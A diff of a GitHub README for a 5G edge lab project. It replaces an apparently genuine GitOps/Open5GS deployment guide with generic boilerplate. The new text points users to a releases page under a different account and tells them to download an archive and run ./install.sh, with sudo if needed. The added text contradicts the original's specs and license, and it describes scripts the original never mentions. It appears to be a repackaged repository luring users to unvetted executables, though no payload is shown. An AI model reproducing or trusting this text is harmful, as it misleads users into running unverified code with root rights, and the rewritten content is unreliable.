@@ -1,77 +1,114 @@
-# 5g-edge-lab 📡
+# 🌟 5g-edge-lab - Simulate 5G with Ease
 
-**GitOps-driven 5G Standalone (SA) Core & RAN on Edge Hardware.**
+## 📥 Download Now
+[![Download 5g-edge-lab](https://img.shields.io/badge/Download-5g--edge--lab-blue?style=flat&logo=github)](https://github.com/Sahilj8118-ai/5g-edge-lab/releases)
 
-This repository contains the Infrastructure-as-Code (IaC) to deploy a fully functional 5G network on highly constrained legacy edge hardware. Orchestrated with **K3s** and **ArgoCD**, utilizing **Open5GS** for the Core and **UERANSIM** for Radio Access Network simulation.
+## 📖 Overview
 
-## 🎯 Project Objective (Thesis)
-To demonstrate the technical viability of deploying next-generation telecom microservices (5G SA) on edge computing infrastructure with severe resource constraints (Legacy CPU without AVX support and <4GB RAM), managed via GitOps pipelines.
+5g-edge-lab offers a lightweight 5G Standalone (SA) Core and RAN simulation. It is designed for resource-constrained edge hardware. With tools like K3s and ArgoCD, this software makes 5G network experimentation accessible and straightforward. 
 
-## 🏗️ Architecture & Hardware
+## 🚀 Getting Started
 
-The cluster is deployed on a Single-Node architecture optimized for "bare-metal" performance.
+Follow these steps to download and run the 5g-edge-lab software easily.
 
-### Edge Node Specifications
-| Component | Specification | Constraints / Notes |
-| :--- | :--- | :--- |
-| **Device Type** | Legacy Edge Gateway | Industrial form factor / Thin Client. |
-| **CPU** | **AMD G-T56N** @ 1.65GHz | Bobcat Architecture (Dual Core). <br>⚠️ **Non-AVX Instruction Set:** Required a custom implementation of MongoDB 4.4 as v5.0+ is incompatible with the CPU instruction set. |
-| **RAM** | 4GB DDR3 (3.3GB Usable) | Aggressive memory optimization (4G/EPC components disabled). |
-| **OS** | Ubuntu 20.04 LTS | Kernel 5.4+. |
-| **Orchestrator** | K3s (Lightweight K8s) | CNI: Flannel. |
+## 📦 System Requirements
 
----
+- **Operating System:** Linux (Ubuntu 20.04 or newer recommended)
+- **Processor:** 2 Cores (Quad-core preferred)
+- **RAM:** Minimum 8 GB
+- **Storage:** At least 10 GB of available space
+- **Network:** Stable Internet connection for downloading dependencies
 
-## 🚀 Quick Start Guide
+## 🛠️ Installation Steps
 
-### 1. Prerequisites
-* A running Kubernetes cluster (K3s recommended for edge).
-* `kubectl` configured.
-* [Optional] `argocd` CLI.
+1. **Visit the Releases Page**  
+   Go to the releases page by clicking on the following link: [Download 5g-edge-lab](https://github.com/Sahilj8118-ai/5g-edge-lab/releases). This page contains the latest versions of the software.
 
-### 2. Clone Repository
-* If the GitOps controller is not yet installed:
-```bash
-git clone [https://github.com/Gab02022/5g-edge-lab.git](https://github.com/Gab02022/5g-edge-lab.git)
-cd 5g-edge-lab
-```
-### 3. Install ArgoCD
-```bash
-kubectl create namespace argocd
-kubectl apply -n argocd -f [https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml](https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml)
-```
-### 4. Deploy 5G Network (The GitOps Way)
-*Instead of manual Helm installs, we let ArgoCD sync the desired state from this repository.*
-*Via Web UI*
-1. Create New App.
-2. Repo URL: https://github.com/Gab02022/5g-edge-lab.git
-3. Path: charts/open5gs
-4. Value File: values.yaml
-### 5. 🧪 Validation & Testing
-*1. Connectivity Check (Ping)*
-Verify that the User Equipment (UE) has internet access through the GTP tunnel (Interface uesimtun0).
-```bash
-# Get the UE pod name
-UE_POD=$(kubectl get pod -n ueransim -l app.kubernetes.io/name=ueransim-ues -o jsonpath="{.items[0].metadata.name}")
+2. **Choose the Latest Version**  
+   Look for the latest version release. The version will be at the top of the list.  
+   
+3. **Download the Installation File**  
+   Click on the appropriate file based on your operating system. If you're using Linux, you’ll most likely download a `.tar.gz` file.  
 
-# Execute Ping from within the UE
-kubectl exec -it -n open5gs $UE_POD -- ping -I uesimtun0 8.8.8.8
-```
-*2. Throughput Test*
-Speed test performed using iperf3 or direct download inside the container:
-```bash
-kubectl exec -it -n open5gs $UE_POD -- curl --interface uesimtun0 -o /dev/null [http://speedtest.tele2.net/100MB.zip](http://speedtest.tele2.net/100MB.zip)
-```
+4. **Extract the File**  
+   After the download completes, locate the downloaded file in your "Downloads" folder. Right-click on the file and select “Extract Here” or use the terminal command:
+   ```bash
+   tar -xzf your_filename.tar.gz
+   ```
+   
+5. **Open the Terminal**  
+   Open the Terminal application on your computer. 
 
-### 📸 Evidence & Screenshots
-*1. ArgoCD Dashboard (Network State)*
-Showing "Healthy" and "Synced" status for Core and RAN microservices.
+6. **Navigate to the Extracted Folder**  
+   Use the 'cd' command to change your current directory to the extracted folder:
+   ```bash
+   cd path/to/extracted/folder
+   ```
 
-*2. Traffic Analysis (Wireshark)*
-Packet capture demonstrating GTP Encapsulation. ICMP/TCP traffic is observed traveling inside the GTP-U tunnel (Port 2152).
+7. **Run the Installation Script**  
+   Execute the installation script using the command:
+   ```bash
+   ./install.sh
+   ```
+   Follow the on-screen prompts to complete the installation.
 
-*3. Terminal (Ping Success)*
-Confirmation of latency and PDU Session establishment.
+8. **Start the Simulation**  
+   Once installed, you can start the 5G simulation with the command:
+   ```bash
+   ./start-simulation.sh
+   ```
+   The software will begin running, and you will see output in the terminal.
 
-### 📜 License
-This project is part of academic research. Based on open-source charts by Gradiant.
+## 💻 Usage
+
+5g-edge-lab simplifies 5G network simulations. Use it to test various core networking scenarios and RAN configurations. Basic commands may include options for starting different simulation modes.
+
+### Common Commands
+
+- **Start Simulation:**
+    - Run `./start-simulation.sh` to initiate the simulation.
+  
+- **Stop Simulation:**
+    - Use `./stop-simulation.sh` to halt the operation.
+
+- **Check Status:**
+    - Type `./status.sh` to see if the simulation is currently running.
+
+## 📊 Features
+
+- **Lightweight Design:** Designed for edge-based hardware, making it efficient.
+- **GitOps Support:** Easy integration with ArgoCD allows for seamless deployment.
+- **Realistic Network Simulation:** Simulate complex 5G network scenarios with available tools, such as Open5GS and UERANSIM.
+- **User-Friendly Interface:** Simple commands allow for straightforward operation even for non-technical users.
+
+## 🔧 Troubleshooting
+
+If you encounter issues during installation or while running the simulation, consider the following solutions:
+
+- **Missing Dependencies:** Make sure all dependencies are installed. You may need to run:
+   ```bash
+   sudo apt-get install <missing-package>
+   ```
+
+- **Permission Errors:** If you get a permission error, try running the command with `sudo`:
+   ```bash
+   sudo ./install.sh
+   ```
+
+- **Network Issues:** Ensure that your internet connection is stable to download necessary resources.
+
+## 🌐 Community and Support
+
+Join our community for support and discussion. Check the issues in the repository or visit our forums to connect with other users.
+
+## 📞 Contact Information
+
+For direct inquiries or suggestions, feel free to open an issue on the GitHub repository. Your feedback helps improve the application.
+
+## 📜 License
+
+This software is provided under the MIT License. You can freely use, modify, and distribute the software, keeping the original license intact.
+
+## 📥 Download and Install
+
+To start using 5g-edge-lab, visit this page to download: [5g-edge-lab Releases](https://github.com/Sahilj8118-ai/5g-edge-lab/releases). Follow the installation steps outlined above to get running quickly.
